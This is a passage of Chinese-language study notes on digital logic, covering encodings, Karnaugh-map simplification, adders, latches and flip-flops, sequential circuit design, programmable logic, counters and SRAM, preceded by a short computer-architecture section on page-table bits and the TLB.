<li>A 位表示自从上次 A 位被清除以来，该页面是否被访问过。他就是我们使用近似LRU算法的信息。如果A=0的话，就可以被换了，因为最近没有被用过。</li>
<li>D 位表示自从上次清除 D 位以来页面是否被弄脏（例如被写入）。如果D=1，那么我们再把他替换走的时候需要写回到磁盘（如果是文件映射，匿名映射也没啥好写的，当然写回都是要操作系统结合别的信息来完成的）。</li>
</ol>
<img src="Basic/Architecture/../images/image-20210606124035973.png" alt="image-20210606124035973" style="zoom:67%;" />
<h3 id="memory-protection"><a class="header" href="#memory-protection">Memory Protection</a></h3>
<p>虚拟存储还有一个很重要的功能是保护每个进程的内存。比如上图的RWXU位就是用来做这些事情的。</p>
<h3 id="tlb"><a class="header" href="#tlb">TLB</a></h3>
<p>TLB是page table的cache。如果我们直接访问DRAM中的Page table，那么需要凭空增加一次内存访问，如果是三级页表就要凭空增加三次内存访问，代价太高。所以出现了TLB专门用来作为Page table的Cache。</p>
<p>TLB作为Cache和Cache的结构是一样的。书上画了Ref和Dirty位，其实Cache也可以有类似的位，用于写回和LR替换策略。</p>
<img src="Basic/Architecture/../images/image-20210604203705293.png" alt="image-20210604203705293" style="zoom:67%;" />
<p>typedef T value_type;</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="notes-数字逻辑"><a class="header" href="#notes-数字逻辑">Notes-数字逻辑</a></h1>
<h2 id="第一章-编码"><a class="header" href="#第一章-编码">第一章 编码</a></h2>
<p>格雷码：相邻两个编码之间只有一位的差距
独热码：
BCD码：用<code>0000～1001</code>表示0到9，其他的不要。
1‘complement：二进制反码，每一位取反。
2'complement：二进制补码。对于一个N位的二进制数$a$,补码为$2^N-a$。
excess-3 code：余3码是和这个十进制数字对应的二进制组合再加3。</p>
<h2 id="第二章-组合逻辑电路"><a class="header" href="#第二章-组合逻辑电路">第二章 组合逻辑电路</a></h2>
<h3 id="1-布尔代数"><a class="header" href="#1-布尔代数">1. 布尔代数</a></h3>
<p>我们可以用布尔代数来表示逻辑门电路。然后利用析取范式（<strong>最小项之和 SOP</strong>）和合取范式（<strong>最大项之积 POS</strong>），可以化成<strong>标准形式</strong>。
Three basic logic operations ：AND、OR、NOT。
我们还有很多运算公式，基本的公式在离散数学里学过，也很显然。但是还有几个好用的公式：</p>
<!--在书上 -->
<ul>
<li>$X+\overline{X}Y = X+XY+\overline{X}Y=X+Y$</li>
<li>$AB+\overline{A}C+BC=AB+\overline{A}C+BC(A+\overline{A})=AB+\overline{A}C$</li>
<li>利用对偶(dual)式进行化简：对偶式就是把<strong>与换成或、或换成与</strong>求两次对偶式和原来式子相等。</li>
</ul>
<h3 id="2-逻辑函数的化简"><a class="header" href="#2-逻辑函数的化简">2. 逻辑函数的化简</a></h3>
<p>我们有三个判断化简程度的标准：</p>
<ul>
<li>文字成本（Literal cost，简称<strong>L</strong>）：对表达式中所有的文字计数即可。</li>
<li>门输入成本（gate-input cost，简称<strong>G</strong>）：与等式一一对应的实现中所用<strong>门输入端的个数</strong>。那么怎么从等式中计算呢？首先计算所有的文字，然后再加上所有运算(<em>不包括非</em>)所代表的门个数，再-1。</li>
<li>包括非门的门输入成本，称为<strong>GN</strong>。</li>
</ul>
<p>我们可以用公式法化简。公式法没有办法判断是否化到了最简，只能尽力而为。
最小项（Minterm）最大项（Maxterm），这个也在离散里讲过。公式看上面。</p>
<p>我们还可以利用<strong>卡诺图</strong>化简。（卡诺图是重点）。卡诺图可以用于<strong>两级电路</strong>的化简。
我不知道怎么表达卡诺图的化简办法，只能说卡诺图中所有相邻的项都有公共因子，可以组合起来。我们首先确定所有的prime，然后对所有的essential作和，在用prime包含剩下的，就完成了化简。这个还是看书和动手吧，需要熟练，我的水平讲不清楚。
卡诺图化简有几个概念：</p>
<ul>
<li>方格(rectangle)：在卡诺图中指的是包含2^m个小方格的矩形。</li>
<li>蕴含项(implicant)：函数对某个乘积项的所有最小项取值为1，成为蕴含项。在卡诺图中就是由1组成的方格。</li>
<li>主蕴含项(prime implicant)：如果从该乘积项P中移除任何一个变量，得到的乘积项不再是函数的蕴含项，则P称为主蕴含项。在卡诺图中就是由1组成的尽可能大的方格。</li>
<li>必要主蕴含项/质主蕴含项(essential prime implicant)：如果存在一个1的最小项，仅存在于某个主蕴含项中，那么这个主蕴含项就是必要主蕴含项。</li>
<li>无关最小项(don't care condition)：在实际情况中，某些输入组合的取值我们不关心他是0还是1,我们用X来表示。他可以辅助化简，即可以当成0又可以当成1。我们用<code>d</code>表示。</li>
</ul>
<h3 id="3-组合逻辑电路的设计"><a class="header" href="#3-组合逻辑电路的设计">3. 组合逻辑电路的设计</a></h3>
<p>设计一个数字系统的步骤为。</p>
<ol>
<li><strong>Specification</strong>。指定所需的行为。有几种输入、输出，并为他分配变量。</li>
<li><strong>Formulation</strong>。以布尔方程或真值表的方式对系统的输入和输出进行<strong>形式化</strong>。</li>
<li><strong>Optimization</strong>。优化（化简），比如两极电路的化简可以利用卡诺图。</li>
<li><strong>Technology Mapping</strong>。工艺映射。工艺映射指的是将逻辑图转换成可以用工艺实现的新的图。例如我们只有与非门，那我们要把我们用到的元器件都用与非门进行替换，但仍然保持原来的功能。我们得到设计的电路图。</li>
<li><strong>Verification</strong>。验证设计的正确性。这个非常复杂。</li>
</ol>
<p>逻辑电路的设计主要分成 组合逻辑电路设计和时序电路设计，组合逻辑电路的状态只和输入有关，和上一个状态无关。</p>
<p>时序逻辑电路分析：根据电路从第一层向后列出每个门的方程，化简。这样就可以得到输出的方程。</p>
<h3 id="4-元件"><a class="header" href="#4-元件">4. 元件</a></h3>
<h4 id="40-基本的逻辑门"><a class="header" href="#40-基本的逻辑门">4.0 基本的逻辑门</a></h4>
<p>And、Or、Not、Xor、Nor、Nand等。
<img src="Basic/Architecture/../images/1609852233658.png" style="zoom: 67%;" />
Universal Gate：可以独自实现所有布尔函数的逻辑门，比如Nor和Nand。
与、或门的开、关门特点：<code>1 and X=X, 0 and X=0</code> 和 <code>1 or X=1, 0 or X = X</code>
异或的同相、反相性质：<code>1 xor X = ~X, 0 xor X = X</code>
三态门：<img src="Basic/Architecture/../images/1610020658260.png" alt="" /></p>
<h4 id="41-译码器decoder"><a class="header" href="#41-译码器decoder">4.1 译码器Decoder</a></h4>
<p>我们知道N bit可以表示2^N种编码信息。Decoder的作用就是把一个N位输入转换成M位(通常$2^{N}&gt;=M&gt;N$)输出的元件。</p>
<p>一个2-4选择器的电路：
<img src="Basic/Architecture/../images/1609854615900.png" style="zoom:50%;" />
对于规模更大的选择器，我们可以用“二分法”来减少元件的数量。
<img src="Basic/Architecture/../images/1609854634110.png" style="zoom:67%;" /></p>
<p><strong>译码器可以实现任何组合电路</strong>。译码器把N位输入分成了2^N最小项，然后我们用一个或门把它们连接起来。比如下面是一个二进制加法器：
<img src="Basic/Architecture/../images/1609854713228.png" style="zoom:50%;" /></p>
<h4 id="42-编码器encoder"><a class="header" href="#42-编码器encoder">4.2 编码器Encoder</a></h4>
<p>这个好像用的少一点。是Decoder的反向。可以用或门实现。比如2-4Encoder。</p>
<p>$A_0 = \overline {D_1}+\overline{D_0}，A_1=\overline{D_1}+D_0,A_2=D_1+\overline{D_0},A_3=D_1+D_0$ </p>
<p>当然这是最基础的，进一步我们可以给多个不同的状态分配同一个编码，但注意不要让一个状态对应多个编码（往往由无关项导致）。</p>
<h4 id="43-多路复用器muxmultiplexers"><a class="header" href="#43-多路复用器muxmultiplexers">4.3 多路复用器MUX(Multiplexers)</a></h4>
<p>多路复用器是一个组合电路，他的作用是从多条输入中选择一个输入。
我们来看多路复用器的一般构成：
<img src="Basic/Architecture/../images/1609854741211.png" style="zoom:67%;" /></p>
<p><strong>多路复用器也可以用来实现任何组合电路</strong>，有两种方法，我们还是以二进制加法器为例。
第一种非常的简单粗暴，在输入端直接把编码对应的真值表的值输入进去。这样我们在译码器的输入经过译码之后，直接选择到对应的输入。
<img src="Basic/Architecture/../images/1609854794283.png" style="zoom: 67%;" />
另一种方法稍微好一点。把其中的一位作为输入了。
<img src="Basic/Architecture/../images/1609854813013.png" style="zoom:67%;" /></p>
<h4 id="44-二进制加法器binary-adders"><a class="header" href="#44-二进制加法器binary-adders">4.4 二进制加法器Binary Adders</a></h4>
<p>半加器忽略了进位：<img src="Basic/Architecture/../images/1609907018629.png" style="zoom:50%;" />
全加器可以由两个半加器组成。也可以选择化简，注意到进位的情况是<code>Ai=Bi=1</code>，或者<code>Ai+Bi=1</code>并且<code>Ci=1</code>。我们记<code>{Gi,Pi}=Ai+Bi</code>。
<img src="Basic/Architecture/../images/1609907093490.png" style="zoom:50%;" />
<img src="Basic/Architecture/../images/1611209295600.jpg" alt="" />
**4位行波进位加法器 4-Bit Ripple Carry Adder。**这个也比较好理解，但是存在的问题是门的延迟会积累越来越大。</p>
<img src="Basic/Architecture/../images/1609907187917.png" style="zoom:50%;" />
**超前进位加法器Carry Lookahead**可以避免延迟的积累过大。注意到我们的进位一位一位往上进造成了很大的延迟，那我们只需要提前把进位算出来就好了。借助上面提到的Gi和Pi。我们有：
<ul>
<li>$C_1 = G_0+P_0C_0$</li>
<li>$C_2=G_1+P_1C_1=G_1+P_1G_0+P_1P_0C_0$</li>
<li>$C_3=G_2+P_2C_2=G_2+P_2G_1+P_2P_1G_0+P_2P_1P_0C_0$</li>
<li>以此类推。</li>
</ul>
<p>注意到到后面这个电路的规模越来越大，也不好。所以对于更大的加法器，我们可以把行波和超前合并起来。</p>
<p>利用加法器，我们也可以实现减法。称为加减法器，需要分成有符号数和无符号数讨论。</p>
<ul>
<li>我们首先考虑无符号数的减法 $A-B$ 。就是把输入B取反，然后在第0个进位赋1。(一个数的补码=取反+1)。如何判断正负呢？因为我们前面做得操作实际上把问题变成了 $A+2^4-B$ ，所以我们的最后一个进位 $C_4$ 如果是1，那么说明结果为正；如果为0，说明结果为负。对于两个无符号数的相加，我们需要考虑的是溢出问题，也是关注如果最后一个进位$C_4$ ,如果是1说明溢出。</li>
<li>再考虑如果我们使用补码代表有符号数$A-B$，类似的我们也把B进行取反加1的操作。这时的加减法可以一起考虑溢出和正负问题。正负很好考虑，只需要考虑结果的符号位就行了。至于溢出的话，是<code>正+正=负</code>和<code>负+负=正</code>两种情况，这个可以等价于$C_4 \ xor\ C_3 = 1$，因为我们关注符号位的话就是$0+0=1(C_4=0,C_3=1)$和$1+1=0(C_4=1,C_3=0)$。</li>
</ul>
<h2 id="第三章-时序电路--sequential-circuits"><a class="header" href="#第三章-时序电路--sequential-circuits">第三章 时序电路  Sequential Circuits</a></h2>
<p>时序电路分为同步Synchronous和异步Asynchronous的。我们主要学习同步的。
<img src="Basic/Architecture/../images/1609999918576.png" alt="" />
除了分析时序电路的功能，还有两个重要的参数：</p>
<ul>
<li>Maximum input-to-output delay：电路从输入到输出的最大延迟。要求这个最大延迟，我们要考虑每条路径上信号变化的传播延迟。每条路径的延迟由三部分组成：
<ul>
<li>触发器传播延迟$t_{pd},FF$ </li>
<li>路径上系列们产生的组合逻辑延迟$t_{pd},COMB$</li>
<li>触发器的建立时间$t_{s}$。当一个信号沿着路径传播时，它的延迟等于这三者之和。 ️ ️</li>
</ul>
</li>
<li>Maximum clock frequency：电路能正常工作的最大时钟频率。</li>
</ul>
<h3 id="1-存储元件"><a class="header" href="#1-存储元件">1. 存储元件</a></h3>
<p>元件的标准图形：注意这里的尖三角表示<strong>边沿触发</strong>。第二行的脉冲触发，使用较少。</p>
<img src="Basic/Architecture/../images/1608218520806.png" style="zoom:67%;" />
<h3 id="11-锁存器-latch"><a class="header" href="#11-锁存器-latch">1.1 锁存器 Latch</a></h3>
<p>锁存器是满足下面三个条件的元器件</p>
<ol>
<li>可以维持一个稳定状态。</li>
<li>稳定状态是0或1。</li>
<li>在特定条件下，状态可以再0和1之间切换。</li>
</ol>
<p>锁存器的一般用途是用来组成触发器。
锁存起存在着<strong>空翻问题</strong>，就是在一个周期内，输出的值可以发生多次变化。以D Latch为例，当C=1的时候，输出Q的值可以随着D的变化发生多次变化。</p>
<h4 id="sr-latch"><a class="header" href="#sr-latch">SR Latch</a></h4>
<p>或非门组成的SR Latch，是1有效。用与非门也可以组成Latch。
注意到当<code>S=R=1</code>的时候，两个输出都是0，这是非法的输出。
<img src="Basic/Architecture/../images/1608032567630.png" style="zoom:50%;" /></p>
<h4 id="d-latch"><a class="header" href="#d-latch">D Latch</a></h4>
<p>为了防止<code>S=R=1</code>这种非法输出，引入D Latch。C可以是控制信号Control，也可以是时钟信号Clock。</p>
<ul>
<li>C=0的时候，右边SR锁存器的输入是1,1，状态不变。</li>
<li>C=1的时候，右边SR锁存器的输入取决于D。
<img src="Basic/Architecture/../images/1608032826050.png" style="zoom:50%;" /></li>
</ul>
<p>下面举一个具体的空翻例子，当C=1的时候，输出Y会不停的变化，变化频率取决于元器件的Propagation Delay Time。
<img src="Basic/Architecture/../images/1611215422992.jpg" alt="" /></p>
<h3 id="21-触发器-flipflop"><a class="header" href="#21-触发器-flipflop">2.1 触发器 FlipFlop</a></h3>
<p>通常情况下，Flipflop是由Latch组成的。构造触发器通常用两个Latch构成Master-Slave Flip-flop。
触发器有两个输出端，一个存储正常值，一个存储反值。
我们有几个时间参数Timing来评价一个触发器：</p>
<ul>
<li>setup time：$t_s$在时钟触发沿<strong>之前</strong>，input必须保持不变的最小时间。小于可能对输出造成错误。</li>
<li>hold time：$t_h$在时钟触发沿<strong>之后</strong>，input必须保持不变的最小时间。小于可能对输出造成错误。</li>
<li>minimum clock pulse width：$min(t_w)$最小的时钟脉冲宽度。小于锁存器没有足够的时间捕获输入值。</li>
<li>propagation delay time：$t_{pd}$时钟触发沿和输出为一个稳定的新值之间的时间间隔。</li>
</ul>
<h4 id="sr-master-slave-flipflop"><a class="header" href="#sr-master-slave-flipflop">SR Master-Slave Flipflop</a></h4>
<img src="Basic/Architecture/../images/1608033665001.png" style="zoom: 33%;" />
<p>使用较少。存在一次性采样问题（1s catching）。就是说在C=1的时候，我们的输入是一直可以改变并改变Y的值的。但是最后被传递给Q的只有在<code>t=1-&gt;0</code>时刻的值。如红框中的部分，S偶然有一个尖峰，此时C=1，那么Y就被设置成1并保存下来。然后在<code>t=1-&gt;0</code>的时候传递给了输出，就得到了错误的结果。这个也是边沿触发。再入红框左边的部分。还存在一个问题，就是R=S=1的非法输入问题。</p>
<img src="Basic/Architecture/../images/1608034936964.png" style="zoom:50%;" />
<h4 id="negative-edge-triggered-d-flip-flop"><a class="header" href="#negative-edge-triggered-d-flip-flop">Negative-Edge-Triggered D Flip-Flop</a></h4>
<p>D锁存器是目前使用最为广泛的flip-flop。
考虑输出随时钟变化的情况：</p>
<ul>
<li>当时钟为0时，Master不变，Slave和Master保持一致，由于Master不变所以Slave也不变。</li>
<li>从0到1时，Master开启，Slave关闭。</li>
<li>当时钟为1时，Master和输入保持同步，但是此时Slave关闭，保持不变。</li>
<li>从1到0，此时Master关闭，Slave打开，Master的值被复制到Slave中。</li>
</ul>
<p>所以，我们的输出只有在负边沿才会改变，在除此之外的时钟周期保持稳定。如果我们想改变输出，应该在高电平时给他一个稳定的输入。
<img src="Basic/Architecture/../images/1608034355200.png" style="zoom:33%;" /></p>
<h4 id="jk边沿触发器"><a class="header" href="#jk边沿触发器">JK边沿触发器</a></h4>
<img src="Basic/Architecture/../images/1608037104704.png" style="zoom:25%;" />
<ul>
<li>J=1, K=0：Set</li>
<li>J=0, K=1：Reset</li>
<li>J=1, K=1：取反</li>
<li>J=0, K=0：保持</li>
</ul>
<p>怎么分析呢？举个例子：<img src="Basic/Architecture/../images/1608037829146.jpg" style="zoom:25%;" /></p>
<h4 id="t触发器"><a class="header" href="#t触发器">T触发器</a></h4>
<p><img src="Basic/Architecture/../images/1608038133879.png" alt="" />
<img src="Basic/Architecture/../images/1607484176901.png" alt="" /></p>
<h3 id="2-时序电路分析"><a class="header" href="#2-时序电路分析">2. 时序电路分析</a></h3>
<p>时序电路的行为是由电路的<strong>输入input</strong>，<strong>输出output</strong>和<strong>状态state</strong>决定的。
我们对时序电路的分析，就是要确定输入输出和状态的时间序列。</p>
<h4 id="21-同步时序电路的描述"><a class="header" href="#21-同步时序电路的描述">2.1 同步时序电路的描述</a></h4>
<p>同步时序电路的结构和功能，可用三组逻辑函数表达式描述。</p>
<ol>
<li>
<p><strong>输出output</strong>函数表达式：是一组反映电路输出Z与输入x和<strong>现态</strong>y之间关系的表达式。
<code>Zi = fi(x1，…，xn ,y1,…，ys)  i=1,2,…,m（Mealy型电路，输出和输入有关)</code>
<code>Zi = fi(y1，…，ys)　　　　    i=1,2,…,m（Moore型电路，输出和输入无关）</code></p>
</li>
<li>
<p><strong>激励excitation函数</strong>表达式： 激励函数又称为控制函数，它反映了存储电路的输入Y与外部输入x和电路状态y之间的关系。其函数表达式为
<code>存储电路的输入Y = g(外部输入X,电路状态y)</code></p>
</li>
<li>
<p><strong>次态</strong>函数(Next state function)表达式：
<code>次态y(n+1) = f(存储电路输入Y,现态y(n))</code></p>
</li>
<li>
<p><strong>输入方程</strong>：在组合逻辑电路中，为触发器产生输入信号的组合电路部分，可以用一个布尔函数集合来描述。这个布尔函数集合就称为<strong>触发器输入方程( flip-flop input equation )。</strong>。这个和次态方程/激励方程差不多是一个东西。
比如$D_A=AX+BX$，描述的就是一个D触发器，输出是<code>A</code>，输入部分是<code>AX+BX</code>的组合逻辑</p>
</li>
</ol>
<h4 id="22-state-table"><a class="header" href="#22-state-table">2.2 state table</a></h4>
<p>一般我们画二维的状态表。比如这样：（这里我们还没有对状态ABCD进行编码，编码之后就变成数字了，X是输入）
<img src="Basic/Architecture/../images/1608084061130.png" style="zoom:50%;" /></p>
<h4 id="23-state-diagrams"><a class="header" href="#23-state-diagrams">2.3 state diagrams</a></h4>
<p>圆圈表示现在的状态，箭头显示了状态之间的切换。
<code>/</code>后面的是输出，对于Moore型，输出和输入无关，所以输出放在状态部分写；对于Meerly型，输出和输入有关，所以输出放在状态转移的部分写。
<img src="Basic/Architecture/../images/1608209719204.png" style="zoom:50%;" /></p>
<h4 id="状态图的化简"><a class="header" href="#状态图的化简">状态图的化简</a></h4>
<p><img src="Basic/Architecture/../images/1608272243991.png" alt="次态相同" style="zoom: 50%;" />次态相同的情况，这两个状态可以合并。
<img src="Basic/Architecture/../images/1608272298748.png" style="zoom: 50%;" />这种情况，可以把<code>Si</code>和<code>Sj</code>合并，然后自循环，输出由状态决定。
<img src="Basic/Architecture/../images/1608272991432.png" style="zoom: 50%;" />可以把<code>Si和Sj</code>合并，<code>Sk和Sl</code>合并。</p>
<h3 id="3-时序电路设计-sequential-circuit-design"><a class="header" href="#3-时序电路设计-sequential-circuit-design">3. 时序电路设计 Sequential Circuit Design</a></h3>
<ol>
<li>Event Description</li>
<li><strong>我们画出状态图或者状态表</strong>State diagram state table/compressed state
要注意的是，我们可能会在不知不觉分配很多状态。这是要化简的。</li>
<li>状态分配state allocation/Assignment 
比如我们现在有4个状态ABCD。
我们可以用计数的方式分配ABCD为00,01,10,11
也可以用格雷码的方式分配为00,01,11,10。这样在用卡諾图化简的时候可能有优势。
还有独热(one-hot)码，分配为0001,0010,0100,1000。这样给每一个状态都使用了一个触发器。</li>
<li>choose Flip-Flop
其实我们一般都是采用D-FlipFlop。对上面的每一位编码使用一个D触发器。
<ul>
<li>根据<strong>次态方程</strong>（通常也就是每一个Flip-flop<strong>输入方程</strong>的组合）找出输入的组合逻辑，化简（一般用卡諾图化简），然后我们确定D-Flipflop输入端的连接（输入和所有D Flipflop输出的组合）。</li>
<li>根据<strong>输出方程</strong>我们确定输出端的连接（输入和所有D Flipflop输出的组合）。</li>
</ul>
</li>
<li>处理未定义的状态Designing with Unused States
例如，我们一共有5个状态，但是我们采用了3bit的编码来表示这五个状态。那么我们会有<code>2^3-5=3</code>个<strong>未定义的状态</strong>。我们按照正常的设计是不会进入这些未定义的状态的。但是事实上，外部干扰或者误操作可能会使我们进入这些未定义的状态。
那么我们应该如何handle这些未定义的状态呢？一般我们有三个选择：
<ol>
<li>定义未定义的状态。The outputs for the unused states may be specified so that any actions that result from entry into and transitions between the unused states are not harmful.</li>
<li>添加表明出现了未定义状态的输出。An additional output may be provided or an unused output code employed which indicates that the circuit has entered an incorrect state.</li>
<li>适当调整未定义状态的下一个状态让它自己回去。To ensure that a return to normal operation is possible without resetting the entire system, the next-state behavior for the unused states may be specified
→The Excitation/input equation 
→ Optimization
→Logic circuit/module mapping</li>
</ol>
</li>
</ol>
<h3 id="4-状态机的设计"><a class="header" href="#4-状态机的设计">4. 状态机的设计</a></h3>
<p>传统的状态图的转换条件都是具体的值，而<strong>状态机图</strong>允许<strong>转换条件TC，Transition Condition</strong>是一个布尔表达式。还有<strong>输出条件OC</strong>，在Moore型中不过要注意的是，对每一种输入情况，我们要确保无效的下一个状态和输出均不会出现，也就是说每一个状态的TC和OC都需要满足这两个条件：1. 互斥 2. 覆盖所有的可能的情况。</p>
<h2 id="第四章-数字硬件实现"><a class="header" href="#第四章-数字硬件实现">第四章 数字硬件实现</a></h2>
<h3 id="1-设计空间-design-space"><a class="header" href="#1-设计空间-design-space">1. 设计空间 Design Space</a></h3>
<h4 id="集成电路"><a class="header" href="#集成电路">集成电路</a></h4>
<p>数字电路采用集成电路构建而成。根据门数分类。</p>
<h4 id="逻辑门的主要参数"><a class="header" href="#逻辑门的主要参数">逻辑门的主要参数</a></h4>
<ul>
<li>Fan-in：一个门可能的输入数量。</li>
<li>Fan-out：一个门驱动输出的<strong>标准负载数</strong>。简单的可以认为是一个输出最多可以驱动的门数量（一个门一般会当作一个标准负载）。</li>
<li>Noise margin（噪声容限）：在不影响输出的情况下允许叠加的最大的外部噪声电压。</li>
<li>Cost for a gate（成本）：specifies a measure of its contribution to the cost of the integrated circuit containing it.</li>
<li>Propagation delay（传输延迟）：指信号发生变化从输入到输出所需要的时间。他又分成三种，参考电压一般指的是最高电压和最低电压的平均值：
<ul>
<li>$t_{PHL}$：输出从高电平到低电平，输入的参考电压 到 输出的参考电压 两者的时间差。</li>
<li>$t_{PLH}$：输出从低电平到高电平，输入的参考电压 到 输出的参考电压 两者的时间差。</li>
<li>$t_{pd}$：上面两者的最大值</li>
</ul>
</li>
<li>Power consumption (功耗)</li>
</ul>
<h3 id="2-programming-technologies"><a class="header" href="#2-programming-technologies">2. Programming Technologies</a></h3>
<h4 id="编程的支撑技术"><a class="header" href="#编程的支撑技术">编程的支撑技术</a></h4>
<ul>
<li>永久性的：Fuse熔断 Antifuse反熔断 Mask programming掩膜</li>
<li>非永久性的：晶体管开关控制，用存储单元控制</li>
</ul>
<h4 id="编程"><a class="header" href="#编程">编程</a></h4>
<p>4种可编程逻辑器件(PLD)
<img src="Basic/Architecture/../images/1608086054726.png" style="zoom:67%;" /></p>
<p><strong>ROM</strong>：Read Only Memory。<strong>固定的与门阵列</strong>和<strong>一组可编程的或门</strong>。
2^N个固定的最小项，我们通过或门连接他们。Memory bank是我们可以编程的部分。
以下图的<code>32×8ROM</code>为例。左边的Decoder，可以看作是寻址的东西。寻到了会是Memory Bank中的一行，如果我们<code>×</code>也就是连接了那么会输出1，没有连接会输出0。
<img src="Basic/Architecture/../images/1608087218995.png" style="zoom:67%;" /></p>
<p><strong>PAL</strong>：<strong>可编程的与门阵列</strong> feeding <strong>一组固定的或门</strong>。
用PAL设计的一般步骤：
首先给出最小项只和形式的布尔代数-利用卡諾图等方法进行优化-连接电路。比如下面的电路
就是根据<code>X = A + BCD</code>编程而得，其他同理。
<img src="Basic/Architecture/../images/1608204042881.png" style="zoom:67%;" /></p>
<p><strong>PLA</strong>：<strong>可编程的与门阵列</strong> feeding <strong>一组可编程的或门</strong>。
所以我们可以用卡諾图化简<code>F</code>和<code>~F</code>，化出最简单的最小项之和。左边连接最小项，右边连接和。
<img src="Basic/Architecture/../images/1608087892000.png" style="zoom:67%;" /></p>
<p><strong>FPGA</strong>：现场可编程门阵列。大多数FPGA采用SRAM进行配置。
很多FPGA用基于查找表（Look-up Table，LUT）的可编程逻辑块来实现组合逻辑函数。查找表可以是我们上面讲述的“用MUX实现任意的组合逻辑”。比如下面这个图如果要实现<code>f(A,B)=AB</code>，只需要让<code>[11]=1,other=[0]</code>即可。
<img src="Basic/Architecture/../images/1610020461135.png" alt="" /></p>
<h2 id="第五章-寄存器和寄存器传输"><a class="header" href="#第五章-寄存器和寄存器传输">第五章 寄存器和寄存器传输</a></h2>
<p><strong>寄存器register</strong>：一个寄存器包含一组触发器。由于每一位触发器可以保存1 bit的信息，因此由n个触发器组成的n bit寄存器可以保存n bit的信息。除了一组触发器外，寄存器还要包含实现其状态转换的门电路。
<strong>计数器counter</strong>：计数器是指在时钟脉冲的激励下，能遍历预先规定好的状态序列的一种寄存器。常见的计数序列有<strong>模N计数器modulo N</strong>、BCD计数器。</p>
<h3 id="寄存器微操作-microoperations"><a class="header" href="#寄存器微操作-microoperations">寄存器微操作 Microoperations</a></h3>
<p>移位微操作
算数微操作
逻辑微操作</p>
<h3 id="寄存器传输操作-transmission"><a class="header" href="#寄存器传输操作-transmission">寄存器传输操作 Transmission</a></h3>
<p><code>R2 ⬅ R1</code> 表示把R1的内容传输到R2
<code>K: R2 ⬅ R1</code> 表示在K的条件下，把R1的内容传输到R2
当然，我们默认了时钟边沿才会进行寄存器的传输。我们有RTL来描述寄存器的传输：
<img src="Basic/Architecture/../images/1610000017539.png" alt="" /></p>
<h3 id="加载"><a class="header" href="#加载">加载</a></h3>
<p><strong>加载loading</strong>：把新信息传送至寄存器称为寄存器的加载。如果所有的位都是在公共时钟脉冲同时加载的，我们称之为<strong>并行加载 parallel</strong>。
并行加载有几种实现方式。
第一种非常简单，就是给时钟信号与上一个Load位。这样当<code>Load=0</code>的时候，时钟信号被禁止，我们不能加载。这种技术被称为<strong>门控时钟clock gating</strong>。
但是这种技术是存在弊端的，在时钟脉冲的路径上插入额外的门，将会带来延迟，或者说是<strong>时钟偏移clock skew</strong>。所以这种方法不建议使用，尤其是在高速系统上。
第二种方法其实是利用一个1-2选择器。选择加载的是输出Q还是新的输入D。虽然电路复杂了一点，但是比较好。
<img src="Basic/Architecture/../images/1609856696148.png" style="zoom:50%;" /></p>
<h3 id="移位"><a class="header" href="#移位">移位</a></h3>
<p><strong>位移寄存器shift register</strong>，指的是能把自己存储的内容进行单向或双向位移的寄存器。
像下面这样，就是4位串行右移寄存器。他可以把自己的内容一位一位的输出出来。
<img src="Basic/Architecture/../images/1609859053233.png" style="zoom:50%;" /></p>
<h3 id="计数器counter"><a class="header" href="#计数器counter">计数器Counter</a></h3>
<p>计数器分为两个类型：
<strong>行波计数器Ripple Counter</strong>：某些触发器的输出值的改变可以改变其他触发器中的值，也就是说某些触发器C输入端的值不是公用的时钟脉冲，而是其他触发器的输出信号。可以看到他十分简单，但是同样的时钟不统一会增加电路的不确定性。
<img src="Basic/Architecture/../images/1609859959320.png" style="zoom:50%;" /></p>
<p><strong>同步计数器Synchronous Binary Counters</strong>：所有的C输入端都是公用的时钟脉冲，并且计数器下一状态的值取决于当前所处的状态。
<strong>串行serial同步计数器</strong>，和行波计数器逻辑相似。不同的是把逻辑移到了输入部分D。
<img src="Basic/Architecture/../images/1609860184431.png" style="zoom:50%;" />
<strong>并行parallel同步计数器</strong>，并行逻辑的优点在于时延较小，对于构建高频、位数多的计数器很有帮助，（可以看到串行的到后面时延越来越大，和之前的行波进位加法器和超前进位加法器可以类比）
<img src="Basic/Architecture/../images/1609860419127.png" style="zoom:50%;" />
我们之前提到计数器是遍历预先规定好的状态序列，也就是说不一定是一个一个往上加。
对于一个任意状态的计数器的设计，就跟设计一个时序电路是一样的。考虑当前状态和下一个状态，列出输入方程设计电路。</p>
<h2 id="第六章-内存memory"><a class="header" href="#第六章-内存memory">第六章 内存Memory</a></h2>
<p>概念：
<strong>Memory</strong>: A collection of storage cells together with the necessary circuits to transfer information to and from them.
<strong>Memory Organization</strong>: the basic architectural structure of a memory in terms of how data is accessed.
<strong>Random Access Memory(RAM)</strong> : a memory organized such that data can be transferred to or from any cell (or  collection of cells) in a time that is not dependent upon the particular cell selected.(访问时间和地址无关)
<strong>Memory Address</strong>: A vector of bits that identifies a particular memory element (or collection of elements).
<strong>Memory Operations</strong>: operations on memory data supported by the memory unit. 通常包括read和write。
来看memory的一般抽象，注意这里的word指的是memory的组织单元，不是2 bytes，
<img src="Basic/Architecture/../images/1609899733272.png" style="zoom:67%;" /></p>
<p>RAM的种类</p>
<ul>
<li>Static：information stored in latches直到断电之前，信息会被一直存储。
SRAM，读写速度快，生产成本高，多用于容量较小的高速缓冲存储器。</li>
<li>Dynamic：information stored as electrical chargeson capacitors（电容）电容的能量会“泄露”，需要周期性的对存储的内容读写来刷新。
DRAM，读写速度较慢，集成度高，生产成本低，多用于容量较大的主存储器。
另一个分类</li>
<li>Volatile–如果断电了存储的信息就丢失了。比如上面提到的SRAM和DRAM。</li>
<li>Non-volatile–断电了存储的信息就仍然保持。比如ROM</li>
</ul>
<h3 id="1-sram-ics-sram集成电路"><a class="header" href="#1-sram-ics-sram集成电路">1. SRAM ICs (SRAM集成电路)</a></h3>
<p>SRAM是由SR Latch构成的，基本单元如下：
<img src="Basic/Architecture/../images/1610006067777.png" alt="" />
SRAM slice，可以看到每个地址有一个selector来选择它，我们可以用一个Decoder来获得它：
<img src="Basic/Architecture/../images/1610006465857.png" alt="" /></p>
<p>通过slice我们就可以构建一个RAM了。我们还需要一个Decoder用来选择地址，以及一个三态门（3-state buffer）比如我们构建一个8×2RAM ICs：</p>
<!-- 这个三态门是干什么用的？ -->
<p><img src="Basic/Architecture/../images/1610008134347.png" alt="" /></p>
